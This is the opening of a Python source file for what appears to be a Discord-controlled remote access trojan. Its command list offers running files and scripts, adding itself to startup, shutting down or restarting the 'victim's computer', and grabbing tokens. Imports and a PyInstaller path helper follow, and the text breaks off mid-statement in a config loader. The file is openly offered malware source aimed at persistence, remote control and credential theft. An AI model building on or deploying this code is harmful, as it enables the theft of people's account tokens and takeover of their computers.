commands = "\n".join([
    ">help - help command",
    ">ls - show directory",
    ">shell - execute script",
    ">run <filename> - run an file",
    ">startup - add to startup",
    ">shutdown - shutdown victim's computer",
    ">restart - restart victim's computer",
    ">token - grab tokens",
    ">exit - exit the program",
])

import discord
import os, sys
import re, json
import shutil
import pyautogui
import requests, subprocess

def res_pash(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

try:
    config = json.loads(open("config.json", "r").read())
except:
    
